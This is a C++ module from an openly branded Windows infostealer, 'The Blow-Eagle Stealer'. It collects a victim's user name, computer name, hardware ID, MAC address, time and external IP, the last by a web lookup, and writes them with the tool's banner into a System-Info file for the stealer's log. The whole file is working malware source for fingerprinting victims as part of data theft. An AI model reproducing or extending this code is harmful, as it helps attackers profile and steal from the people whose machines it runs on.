/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|													by: Nick_Vinesmoke											   |
|											https://github.com/Nick-Vinesmoke									   |
|									https://github.com/Nick-Vinesmoke/The-Blow-Eagle							   |
|==================================================================================================================|
*/

#include "../targets.h"
#include "../../config/config.h"

#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <fstream>
#include <string.h>
#include <string>
#include <ctime>
#include <sstream>
#include <iphlpapi.h>
#include <curl\curl.h>

namespace global 
{
	std::string info = "";

	std::string logo = R"LOGO(|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗  |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝  |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░  |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░  |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗  |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝  |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|)LOGO";
}

/// <summary>
/// get User, Pc name, OS, Hwid , Mac, Time, IPs
/// </summary>
void GetGeneralInfo();

void cursystem::GetSysInfo()
{
	TCHAR string[UNLEN + 1];
	DWORD sizeit = UNLEN + 1;
	GetUserName((TCHAR*)string, &sizeit);
	std::wstring ws(string);
	std::string userName(ws.begin(), ws.end());

	std::string mainPath = "C:/Users/" + userName + config::path + "/System-Info/System-Info.txt";

	GetGeneralInfo();


	std::ofstream file(mainPath, std::ios::app);
	if (file.is_open())
	{
		file << global::logo << std::endl;
		file << global::info;
	}

	file.close();
}

size_t WriteCallbackInfo(char* contents, size_t size, size_t nmemb, std::string* output) {
	size_t totalSize = size * nmemb;
	output->append(contents, totalSize);
	return totalSize;
}

void GetGeneralInfo() 
{
	std::time_t currentTime = std::time(nullptr);

	// Convert the current time to a string
	std::string timeString = std::ctime(&currentTime);

	// Remove the newline character at the end of the string
	timeString.erase(timeString.find_last_not_of("\n") + 1);

	global::info += "Time and Date: " + timeString + '\n';

	TCHAR s[UNLEN + 1];
	DWORD sizethis = UNLEN + 1;
	GetUserName((TCHAR*)s, &sizethis);
	std::wstring ws(s);
	std::string userName(ws.begin(), ws.end());

	global::info += "User name: " + userName + '\n';

	TCHAR str[UNLEN + 1];
	DWORD sizethis1 = UNLEN + 1;
	GetComputerName((TCHAR*)str, &sizethis1);
	std::wstring ws1(str);
	std::string pcName(ws1.begin(), ws1.end());

	global::info += "PC name: " + pcName + '\n';



    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    std::wstring wstr(hwProfileInfo.szHwProfileGuid);
    std::string HWID(wstr.begin(), wstr.end());
    size_t end = std::size(HWID);
    HWID = HWID.substr(1, end - 2);

    global::info += "Hwid: " + HWID + '\n';

	IP_ADAPTER_INFO adapterInfo[16];
	DWORD bufferSize = sizeof(adapterInfo);

	DWORD result = GetAdaptersInfo(adapterInfo, &bufferSize);
	if (result == ERROR_BUFFER_OVERFLOW) {
		std::cerr << "Insufficient buffer size" << std::endl;
	}
	else if (result != ERROR_SUCCESS) {
		std::cerr << "Failed to get adapter information" << std::endl;
	}

	PIP_ADAPTER_INFO adapter = adapterInfo;
	std::stringstream macAddress;

	for (; adapter != nullptr; adapter = adapter->Next) {
		if (adapter->AddressLength != 6) {
			continue;  // Skip non-physical adapters
		}
		macAddress << ":";
		for (DWORD i = 0; i < adapter->AddressLength; ++i) {
			if (i > 0) {
				macAddress << ":";
			}

			macAddress << std::hex << static_cast<int>(adapter->Address[i]);
		}
		macAddress << ":";
		break;
	}

	//std::cout << "MAC Address: " << macAddress.str() << std::endl;

	std::string mac = "";

	for (size_t i = 0; i < std::size(macAddress.str()); i++)
	{
		if (isdigit(macAddress.str()[i]) && macAddress.str()[i - 1] == ':' && macAddress.str()[i + 1] == ':')
		{
			mac += '0';
		}
		mac += macAddress.str()[i];
	}

	mac = mac.substr(1, std::size(mac) - 2);

	global::info += "MAC Address: " + mac + '\n';

	std::string ipAddress = "";


	CURL* curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallbackInfo);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &ipAddress);

		CURLcode res = curl_easy_perform(curl);
		if (res != CURLE_OK) {
			std::cerr << "Failed to retrieve IP address: " << curl_easy_strerror(res) << std::endl;
		}

		curl_easy_cleanup(curl);
	}
	
	global::info += "External IP Address: " + ipAddress + '\n';


}
